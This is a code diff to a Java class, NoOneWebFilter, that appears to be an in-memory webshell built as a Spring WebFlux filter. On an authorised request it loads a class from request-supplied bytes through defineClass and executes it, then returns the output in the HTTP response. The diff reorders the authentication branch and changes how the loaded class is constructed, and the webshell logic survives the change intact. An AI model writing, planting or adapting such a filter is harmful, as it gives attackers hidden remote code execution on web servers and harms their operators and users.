@@ -36,21 +36,20 @@ public class NoOneWebFilter extends ClassLoader implements WebFilter {
     @Override
     public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
         ServerHttpRequest request = exchange.getRequest();
-        if (!isAuthed(request)) {
-            return chain.filter(exchange);
+        if (isAuthed(request)) {
+            ServerHttpResponse response = exchange.getResponse();
+            return getArgFromRequest(exchange)
+                    .switchIfEmpty(Mono.just(new byte[0]))
+                    .map(this::transformReqPayload)
+                    .flatMap(payload -> Mono.fromCallable(() -> executeCore(payload, response))
+                            .subscribeOn(Schedulers.boundedElastic()))
+                    .flatMap(buffer -> response.writeWith(Mono.just(buffer)))
+                    .onErrorResume(e -> {
+                        e.printStackTrace();
+                        return chain.filter(exchange);
+                    });
         }
-
-        ServerHttpResponse response = exchange.getResponse();
-        return getArgFromRequest(exchange)
-                .switchIfEmpty(Mono.just(new byte[0]))
-                .map(this::transformReqPayload)
-                .flatMap(payload -> Mono.fromCallable(() -> executeCore(payload, response))
-                        .subscribeOn(Schedulers.boundedElastic()))
-                .flatMap(buffer -> response.writeWith(Mono.just(buffer)))
-                .onErrorResume(e -> {
-                    e.printStackTrace();
-                    return chain.filter(exchange);
-                });
+        return chain.filter(exchange);
     }
 
     private boolean isAuthed(ServerHttpRequest request) {
@@ -105,9 +104,8 @@ public class NoOneWebFilter extends ClassLoader implements WebFilter {
             coreClass = new NoOneWebFilter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
         }
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-        Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
+        Object httpChannelCore = coreClass.newInstance();
         httpChannelCore.equals(new Object[]{payload, outputStream});
-        httpChannelCore.toString();
         wrapResponse(response);
         byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
         return response.bufferFactory().wrap(data);
